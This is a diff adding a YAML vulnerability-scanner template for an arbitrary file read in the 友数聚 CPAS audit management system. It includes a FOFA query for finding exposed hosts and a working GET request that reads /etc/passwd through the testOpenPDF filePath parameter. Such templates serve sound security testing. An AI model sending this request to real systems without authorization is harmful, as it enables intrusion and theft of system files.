@@ -1,0 +1,15 @@
+id: poc-yaml-youdatasum-cpas-testopenpdf-anyfile-read
+info:
+  name: 友数聚 CPAS审计管理系统 testOpenPDF 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: CPAS审计管理系统
+  fofa: body="/cpasm4/static/cap/font/iconfont.css"
+requests:
+- method: GET
+  path: /cpasm4/iWebPdf/testOpenPDF?filePath=/etc/passwd
+  expression: status_code == 200 && contains(body,"root:") && contains(body,"/bin")
+    && !contains(body,"<") && contains(content_type,"application/pdf")
+variables: {}
+transport: http
